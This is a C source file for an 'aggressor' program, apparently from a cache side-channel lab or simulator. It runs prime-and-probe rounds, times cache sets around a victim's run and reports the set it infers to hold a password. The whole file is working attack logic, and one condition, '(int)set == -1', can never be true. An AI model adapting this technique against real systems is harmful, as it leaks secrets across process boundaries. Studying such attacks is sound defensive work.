#include <attack_layout.h>
#include <builtin.h>
#include <stdint.h>

#define PROBE_BUFFER_BYTES (((NUM_WAYS - 1U) * SET_STRIDE) + (NUM_SETS * LINE_SIZE))
#define EVICTION_VARIANTS 4U
#define TOP_SET_COUNT 3U

static volatile unsigned char probe_buffers[EVICTION_VARIANTS][PROBE_BUFFER_BYTES]
	__attribute__((aligned(SET_STRIDE)));
static uint64_t baseline_scores[NUM_SETS] __attribute__((aligned(SET_STRIDE)));
static uint64_t round_scores[NUM_SETS] __attribute__((aligned(SET_STRIDE)));
static uint64_t total_disturbance[NUM_SETS];
static uint64_t calibration_disturbance[NUM_SETS];
static uint32_t disturbed_rounds[NUM_SETS];
static volatile unsigned char probe_sink;

static volatile unsigned char *set_way_addr(uint32_t variant, uint32_t set, uint32_t way) {
	return probe_buffers[variant] + (way * SET_STRIDE) + (set * LINE_SIZE);
}

static void prime_all_sets(uint32_t variant) {
	for (uint32_t set = 0; set < NUM_SETS; set++) {
		for (uint32_t way = 0; way < NUM_WAYS; way++) {
			probe_sink ^= *set_way_addr(variant, set, way);
		}
	}
}

static uint64_t probe_set(uint32_t variant, uint32_t set) {
	uint64_t t0 = builtin_cycle_count();
	for (uint32_t way = 0; way < NUM_WAYS; way++) {
		probe_sink ^= *set_way_addr(variant, set, way);
	}
	uint64_t t1 = builtin_cycle_count();
	return t1 - t0;
}

static uint32_t rotated_set(uint32_t start, uint32_t index) {
	return (start + index) % NUM_SETS;
}

static void measure_round(uint32_t round) {
	uint32_t variant = round % EVICTION_VARIANTS;
	uint32_t start_set = (round * 17U) % NUM_SETS;

	prime_all_sets(variant);
	for (uint32_t i = 0; i < NUM_SETS; i++) {
		uint32_t set = rotated_set(start_set, i);
		baseline_scores[set] = probe_set(variant, set);
	}

	prime_all_sets(variant);
	builtin_yield();

	for (uint32_t i = 0; i < NUM_SETS; i++) {
		uint32_t set = rotated_set(start_set, i);
		uint64_t after = probe_set(variant, set);
		round_scores[set] = after > baseline_scores[set] ? after - baseline_scores[set] : 0;
	}
}

static void record_round(uint64_t *totals) {
	uint64_t total = 0;

	for (uint32_t set = 0; set < NUM_SETS; set++) {
		total += round_scores[set];
	}

	uint64_t average = total / NUM_SETS;

	for (uint32_t set = 0; set < NUM_SETS; set++) {
		totals[set] += round_scores[set];
		if (totals == total_disturbance && round_scores[set] > average) {
			disturbed_rounds[set]++;
		}
	}
}

static void clear_attack_scores(void) {
	for (uint32_t set = 0; set < NUM_SETS; ++set) {
		total_disturbance[set] = 0;
		disturbed_rounds[set] = 0;
	}
}

static int hottest_set(void) {
	int best_set = -1;
	uint32_t best_rounds = 0;
	uint64_t best_total = 0;

	for (uint32_t set = 0; set < NUM_SETS; set++) {
		if (total_disturbance[set] == 0 && disturbed_rounds[set] == 0) {
			continue;
		}
		if ((int)set == -1 || disturbed_rounds[set] > best_rounds) {
			best_set = (int)set;
			best_rounds = disturbed_rounds[set];
			best_total = total_disturbance[set];
			continue;
		}
		if (disturbed_rounds[set] == best_rounds && total_disturbance[set] > best_total) {
			best_set = (int)set;
			best_total = total_disturbance[set];
		}
	}

	if (best_rounds < (ATTACK_ROUNDS / 2U) || best_total < 8192U) {
		return -1;
	}

	return best_set;
}

static void report_top_sets(void) {
	uint32_t top_sets[TOP_SET_COUNT] = {0, 0, 0};
	uint64_t top_scores[TOP_SET_COUNT] = {0, 0, 0};

	for (uint32_t set = 0; set < NUM_SETS; set++) {
		uint64_t score = total_disturbance[set];

		for (uint32_t i = 0; i < TOP_SET_COUNT; i++) {
			if (score > top_scores[i]) {
				for (uint32_t j = TOP_SET_COUNT - 1; j > i; j--) {
					top_scores[j] = top_scores[j - 1];
					top_sets[j] = top_sets[j - 1];
				}
				top_scores[i] = score;
				top_sets[i] = set;
				break;
			}
		}
	}

	for (uint32_t i = 0; i < TOP_SET_COUNT; i++) {
		uint32_t set = top_sets[i];
		builtin_printf(
			"aggressor: disturbed rank %d set=%d rounds=%d total_delta=%d",
			(int)(i + 1U),
			(int)set,
			(int)disturbed_rounds[set],
			(int)total_disturbance[set]
		);
	}
}

static void run_attack(void) {
	for (uint32_t round = 0; round < CALIBRATION_ROUNDS; round++) {
		measure_round(round);
		record_round(calibration_disturbance);
	}

	clear_attack_scores();

	for (uint32_t round = 0; round < ATTACK_ROUNDS; round++) {
		measure_round(round);
		record_round(total_disturbance);
	}

	for (uint32_t set = 0; set < NUM_SETS; ++set) {
		uint64_t base = calibration_disturbance[set];
		if (total_disturbance[set] > base) {
			total_disturbance[set] -= base;
		} else {
			total_disturbance[set] = 0;
			disturbed_rounds[set] = 0;
		}
	}
}

static void report_inference(void) {
	int secret_set = hottest_set();

	if (secret_set < 0) {
		builtin_printf("aggressor: could not find password set");
		return;
	}

	builtin_printf("aggressor: inferred password set=%d", secret_set);

	report_top_sets();
}

int main(void) {
	builtin_printf("aggressor: start");
	builtin_printf("aggressor: waiting for victim setup");
	builtin_yield();

	run_attack();

	builtin_printf("aggressor: attack complete");
	report_inference();
	builtin_printf("aggressor: done");

	return 0;
}
